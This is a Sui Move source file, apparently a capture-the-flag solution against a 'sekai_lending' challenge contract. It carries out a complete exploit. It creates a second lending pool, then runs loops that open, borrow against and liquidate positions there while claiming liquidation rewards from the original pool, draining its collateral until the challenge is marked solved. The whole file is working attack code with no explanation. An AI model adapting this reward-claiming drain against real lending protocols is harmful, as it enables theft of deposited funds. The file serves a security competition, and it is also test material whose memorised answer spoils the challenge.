module the_solution::solution {

    use challenge::challenge::{Self, Challenge};
    use challenge::collateral_coin::{Self, COLLATERAL_COIN};
    use challenge::sekai_coin::{Self, SEKAI_COIN};
    use challenge::sekai_lending::{Self, SEKAI_LENDING, UserPosition};
    use sui::balance::{Self, Supply};
    use sui::coin::{Self, TreasuryCap, CoinMetadata};
    use sui::tx_context::{Self, TxContext};
    const SEKAI: u64 = 100000000;
    const COLLATERAL: u64 = 1000000000;

    #[allow(lint(self_transfer))]
    public fun solve(challenge: &mut Challenge, ctx: &mut TxContext) {
        let claim = challenge::claim(challenge, ctx);
        let mut sekai_lending = challenge.get_sekai_lending_mut();
        let mut sekai_lending2 = sekai_lending::create(
            coin::zero<COLLATERAL_COIN>(ctx),
            coin::zero<SEKAI_COIN>(ctx),
            ctx,
        );

        let mut position1 = sekai_lending.open_position(ctx);
        sekai_lending.deposit_collateral(&mut position1, claim, ctx);
        let mut sekai_coin = sekai_lending.borrow_coin(&mut position1, 8 * SEKAI, ctx);


        let sekai_coin_half = coin::split(&mut sekai_coin, 4 * SEKAI, ctx);
        sekai_lending.repay_loan(sekai_coin_half, &mut position1, ctx);
        let collateral_coin = sekai_lending.withdraw_collateral(5 * COLLATERAL, &mut position1, ctx);

        sekai_lending2.add_liquidity(sekai_coin, ctx);
        sekai_lending.deposit_collateral(&mut position1, collateral_coin, ctx);
        let mut i = 0;
        let mut rewards = coin::zero<COLLATERAL_COIN>(ctx);
        let collateral_coin = sekai_lending.withdraw_collateral(5 * COLLATERAL, &mut position1, ctx);
        rewards.join(collateral_coin);
        while (i < 22) {
            let collateral_coin = rewards.split(5 * COLLATERAL, ctx);
            let mut position2 = sekai_lending2.open_position(ctx);
            sekai_lending2.deposit_collateral(&mut position2, collateral_coin, ctx);
            let sekai_coin2 = sekai_lending2.borrow_coin(&mut position2, 320_000_000, ctx);
            let mut collateral_coin_4 = sekai_lending2.remove_collateral(4 * COLLATERAL, ctx);

            sekai_lending2.liquidate_position(&mut position2, sekai_coin2, ctx);
            let collateral_coin_1 = sekai_lending2.remove_collateral(1 * COLLATERAL, ctx);
            let reward = sekai_lending.claim_liquidation_reward(&mut position2, ctx);
            rewards.join(reward);

            collateral_coin_4.join(collateral_coin_1);
            rewards.join(collateral_coin_4);
            transfer::public_transfer(position2, tx_context::sender(ctx));
            i = i + 1;
        };

        let coll_split = rewards.split(90 * COLLATERAL, ctx); // 9 REMAIN
        sekai_lending.deposit_collateral(&mut position1, coll_split, ctx);

        let mut sekai_coin = sekai_lending.borrow_coin(&mut position1, 76 * SEKAI, ctx);

        i = 0;
        while (i < 21) {
            let coin_5 = rewards.split(5 * COLLATERAL, ctx);
            let mut position2 = sekai_lending2.open_position(ctx);
            sekai_lending2.deposit_collateral(&mut position2, coin_5, ctx);
            let sekai_coin2 = sekai_lending2.borrow_coin(&mut position2, 320_000_000, ctx);
            let mut collateral_coin_4 = sekai_lending2.remove_collateral(4 * COLLATERAL, ctx);
            sekai_lending2.liquidate_position(&mut position2, sekai_coin2, ctx);
            let collateral_coin_1 = sekai_lending2.remove_collateral(1 * COLLATERAL, ctx);
            let reward = sekai_lending.claim_liquidation_reward(&mut position2, ctx);
            rewards.join(reward);

            collateral_coin_4.join(collateral_coin_1);
            rewards.join(collateral_coin_4);
            transfer::public_transfer(position2, tx_context::sender(ctx));
            i = i + 1;
        };

        sekai_coin.join(sekai_lending2.remove_liquidity(4*SEKAI, ctx)); // 80
        let coll_80 = rewards.split(100 * COLLATERAL, ctx);
        transfer::public_transfer(sekai_lending2, tx_context::sender(ctx));

        challenge.donate_collateral(coll_80);
        challenge.donate_sekai(sekai_coin);

        challenge.is_solved();

        transfer::public_transfer(position1, tx_context::sender(ctx));
        transfer::public_transfer(rewards, tx_context::sender(ctx));
    }

}